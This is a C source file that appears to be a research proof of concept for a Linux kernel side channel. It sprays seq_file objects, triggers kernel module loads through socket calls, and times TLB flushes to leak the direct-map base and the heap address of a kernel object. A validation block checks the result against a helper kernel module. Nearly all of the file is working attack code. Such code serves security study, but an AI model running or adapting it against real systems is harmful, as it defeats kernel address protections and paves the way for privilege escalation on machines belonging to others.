#include "utils.h"
#include "cacheutils.h"
#include "tlb_flush.h"
#include "coarse_grain_leak.h"
#define VALIDATE
#ifdef VALIDATE
#include "ulkm.h"
#endif
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/mman.h>
#define IPPROTO_DCCP 33
#define IPPROTO_SCTP 132
#define IPPROTO_L2TP 115
#define CAN_RAW 1
#define CAN_BCM 2
#define CAN_ISOTP 6

#define OBJS_PER_SLAB 34
#define FILES_SPRAY (OBJS_PER_SLAB*200)
#define FILES (OBJS_PER_SLAB*10)

#define TRIES 40

char buffer[1<<12];
void get_times(int fd, size_t addr, size_t tries, size_t *time, size_t *time_n2, size_t *time_n4)
{
    size_t times[tries];
    size_t times_n2[tries];
    size_t times_n4[tries];
    for (size_t i = 0; i < tries; ++i) {
        flush_tlb_targeted_4k(addr);
        flush_tlb_targeted_4k(addr+2*(1<<12));
        flush_tlb_targeted_4k(addr+2*(1<<12));
        lseek(fd, 0, SEEK_SET);
        times[i] = onlyreload(addr);
        times_n2[i] = onlyreload(addr+2*(1<<12));
        times_n4[i] = onlyreload(addr+4*(1<<12));
    }
    qsort(times, tries, sizeof(size_t), comp);
    qsort(times_n2, tries, sizeof(size_t), comp);
    qsort(times_n4, tries, sizeof(size_t), comp);
    *time = times[tries/4];
    *time_n2 = times_n2[tries/4];
    *time_n4 = times_n4[tries/4];
}
int is_2mb(int fd, size_t addr, size_t tries)
{
    size_t time;
    size_t time_n2;
    size_t time_n4;
    get_times(fd, addr, tries, &time, &time_n2, &time_n4);
    return (time < THRESHOLD && time_n2 < THRESHOLD && time_n4 < THRESHOLD);
}
int hit_flush(int fd, size_t addr, size_t tries)
{
    size_t time;
    size_t time_n2;
    size_t time_n4;
    get_times(fd, addr, tries, &time, &time_n2, &time_n4);
    return (time < THRESHOLD && (time_n2 > THRESHOLD || time_n4 > THRESHOLD));
}

int main(void)
{
    printf("[*] start\n");
    set_limit();
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    pin_to_core(0);

    init_tlb_flush();
    get_total_memory();

    for (size_t i = 0; i < FILES_SPRAY; ++i)
        open("/proc/self/stat", O_RDONLY);

    printf("[*] load 1st half of kernel modules\n");
    int sock_fd;
    sock_fd = socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP);
    if (sock_fd < 0) {
        perror("socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP)");
        exit(-1);
    }
    sock_fd = socket(SOCK_DGRAM, CAN_BCM, 0);
    if (sock_fd < 0) {
        perror("socket(SOCK_DGRAM, CAN_BCM, 0)");
        exit(-1);
    }
    sock_fd = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("socket(AF_VSOCK, SOCK_STREAM, 0)");
        exit(-1);
    }

    int fds[FILES];
    for (size_t i = 0; i < FILES; ++i) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
        if (fds[i] < 0) {
            perror("open(/proc/self/stat)");
            exit(-1);
        }
    }

    printf("[*] load 2nd half of kernel modules\n");
    sock_fd = socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP);
    if (sock_fd < 0) {
        perror("socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP");
        exit(-1);
    }
    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
    if (sock_fd < 0) {
        perror("socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP)");
        exit(-1);
    }
    sock_fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_L2TP);
    if (sock_fd < 0) {
        perror("socket(PF_INET, SOCK_STREAM, IPPROTO_L2TP)");
        exit(-1);
    }

    __attribute__((unused))size_t found_addresses[32];
    size_t found_addresses_index = 0;

#ifdef VALIDATE
    lkm_init();
    size_t seq_file_0;
    size_t seq_file_1;
    size_t seq_file_2;
    size_t seq_file_3;
    size_t seq_file_33;
    lkm_seq_file_leak((size_t)&seq_file_0, fds[0]);
    printf("[*] seq_file  0 %016zx\n", seq_file_0);
    lkm_seq_file_leak((size_t)&seq_file_1, fds[1]);
    printf("[*] seq_file  1 %016zx\n", seq_file_1);
    lkm_seq_file_leak((size_t)&seq_file_2, fds[2]);
    printf("[*] seq_file  2 %016zx\n", seq_file_2);
    lkm_seq_file_leak((size_t)&seq_file_3, fds[3]);
    printf("[*] seq_file  3 %016zx\n", seq_file_3);
    lkm_seq_file_leak((size_t)&seq_file_33, fds[OBJS_PER_SLAB-1]);
    printf("[*] seq_file %d %016zx\n", OBJS_PER_SLAB-1, seq_file_33);

    size_t is_4kb = lkm_is_4kb(seq_file_0);
    printf("[*] %016zx is %s page\n", seq_file_0, is_4kb ? "4kB" : "2MB");
#endif

    size_t dpm_base = dpm_leak(TRIES);
    printf("[*] dpm_base: %016zx\n", dpm_base);
    for (size_t addr = dpm_base; addr < dpm_base+mem_total_rounded; addr += (1<<21)) {
        if ((addr % (1 << 30)) == 0)
            printf("[*] addr %016zx\n", addr);
        if (is_2mb(fds[0], addr, 40))
            continue;

        for (size_t i = 0; i < (1ULL << 21); i += (1ULL << 12)) {
            size_t cur_addr = addr + i;
            size_t found_0 = hit_flush(fds[0], cur_addr, TRIES);
            if (!found_0)
                continue;

            size_t found_ns1 = hit_flush(fds[OBJS_PER_SLAB], cur_addr, TRIES);
            if (found_ns1)
                continue;
            size_t found_ns2 = hit_flush(fds[OBJS_PER_SLAB*2], cur_addr, TRIES);
            if (found_ns2)
                continue;
            size_t found_ns3 = hit_flush(fds[OBJS_PER_SLAB*3], cur_addr, TRIES);
            if (found_ns3)
                continue;
            size_t found_ns4 = hit_flush(fds[OBJS_PER_SLAB*4], cur_addr, TRIES);
            if (found_ns4)
                continue;
            size_t found_ns5 = hit_flush(fds[OBJS_PER_SLAB*5], cur_addr, TRIES);
            if (found_ns5)
                continue;
            size_t found_ns6 = hit_flush(fds[OBJS_PER_SLAB*6], cur_addr, TRIES);
            if (found_ns6)
                continue;

            size_t found_1 = hit_flush(fds[1], cur_addr, TRIES);
            if (!found_1)
                continue;
            size_t found_2 = hit_flush(fds[2], cur_addr, TRIES);
            if (!found_2)
                continue;
            size_t found_3 = hit_flush(fds[3], cur_addr, TRIES);
            if (!found_3)
                continue;
            
            if (found_addresses_index == 32) {
                printf("[?] too much found addresses\n");
                continue;
            }
            found_addresses[found_addresses_index++] = cur_addr;
            printf("[+] found addr %016zx\n", cur_addr);
        }
    }
    if (found_addresses_index == 0)
        printf("[*] non found -> retry\n");
    else if (found_addresses_index != 1)
        printf("[*] multiple addresses -> retry\n");
#ifdef VALIDATE
    else if (found_addresses[0] == (seq_file_0 & ~((1<<12)-1)))
        printf("[+] success\n");
    else
        printf("[!] fail\n");
#else
    else
        printf("[*] found %016zx\n", found_addresses[0]);
#endif
}